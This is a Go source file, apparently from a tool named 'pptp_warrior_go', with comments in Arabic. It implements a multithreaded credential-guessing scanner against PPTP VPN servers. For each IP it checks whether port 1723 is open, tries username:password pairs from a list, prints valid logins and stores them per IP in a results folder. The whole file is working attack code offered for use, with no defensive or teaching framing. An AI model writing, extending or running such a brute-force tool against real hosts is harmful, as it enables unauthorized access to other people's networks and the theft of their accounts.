package scanner

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"pptp_warrior_go/internal/vpn"
)

type Scanner struct {
	Threads int
	Timeout time.Duration
	Users   []string
}

func NewScanner(threads int, timeout time.Duration, usersFile string) (*Scanner, error) {
	users, err := readLines(usersFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read users file: %v", err)
	}
	return &Scanner{
		Threads: threads,
		Timeout: timeout,
		Users:   users,
	}, nil
}

func (s *Scanner) ScanIPs(ips []string) {
	fmt.Printf("[*] Starting targeted authentication scan on %d IPs with %d workers...\n", len(ips), s.Threads)
	
	ipChan := make(chan string, len(ips))
	for _, ip := range ips {
		ipChan <- ip
	}
	close(ipChan)

	var wg sync.WaitGroup
	_ = os.MkdirAll("results", 0755)

	for i := 0; i < s.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range ipChan {
				for _, line := range s.Users {
					line = strings.TrimSpace(line)
					if line == "" || !strings.Contains(line, ":") {
						continue
					}

					parts := strings.SplitN(line, ":", 2)
					username := parts[0]
					password := parts[1]

						// التحقق من أن بورت 1723 مفتوح أولاً لتوفير الوقت
						conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, "1723"), 2*time.Second)
						if err != nil {
							break // إذا كان البورت مغلقاً، لا داعي لتجربة باقي المستخدمين لهذا الآيبي
						}
						conn.Close()

						success, err := vpn.ConnectPPTP(ip, username, password, s.Timeout)
						if err != nil {
							continue
						}

						if success {
						resultStr := fmt.Sprintf("[SUCCESS] Valid Match Found! IP: %s | User: %s | Pass: %s\n", ip, username, password)
						fmt.Print(resultStr)
						s.saveResult(ip, username, password)
						
						// تنظيف فوري لعملية pppd للنظام المرتبطة بهذا الآيبي
						exec.Command("sudo", "killall", "-9", "pppd").Run()
						break 
					} else {
						fmt.Printf("[-] Invalid Account: %s (%s:%s)\n", ip, username, password)
					}
				}
			}
		}()
	}
	wg.Wait()
	
	// تنظيف نهائي وشامل لكل العمليات عند انتهاء الفحص بالكامل للعودة إلى الشاشة الرئيسية
	exec.Command("sudo", "killall", "-9", "pppd").Run()
	fmt.Println("[+] Scan session completed successfully. All processes cleaned.")
}

func (s *Scanner) saveResult(ip, user, pass string) {
	// حفظ في الملف العام
	f, err := os.OpenFile("results/success.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(fmt.Sprintf("IP: %s | User: %s | Pass: %s | Time: %s\n", ip, user, pass, time.Now().Format(time.RFC3339)))
		f.Close()
	}

	// إنشاء مجلد خاص للآيبي لحفظ تفاصيل الشبكة لاحقاً
	targetDir := fmt.Sprintf("results/%s", ip)
	_ = os.MkdirAll(targetDir, 0755)
	
	// حفظ الحساب الناجح داخل مجلد الآيبي أيضاً للتوثيق السريع
	infoPath := fmt.Sprintf("%s/account.txt", targetDir)
	_ = os.WriteFile(infoPath, []byte(fmt.Sprintf("User: %s\nPass: %s\nTime: %s\n", user, pass, time.Now().Format(time.RFC3339))), 0644)
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}